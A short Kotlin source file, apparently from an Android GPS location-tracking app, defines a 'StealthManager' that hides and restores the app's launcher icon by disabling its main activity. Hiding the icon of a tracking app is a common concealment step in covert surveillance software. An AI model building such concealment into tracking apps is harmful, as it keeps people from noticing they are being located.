package app.gpslocation.id.services

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthManager {

    fun hideAppIcon(context: Context) {
        val p = context.packageManager
        val componentName = ComponentName(context, "app.gpslocation.id.MainActivity")
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    fun showAppIcon(context: Context) {
        val p = context.packageManager
        val componentName = ComponentName(context, "app.gpslocation.id.MainActivity")
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}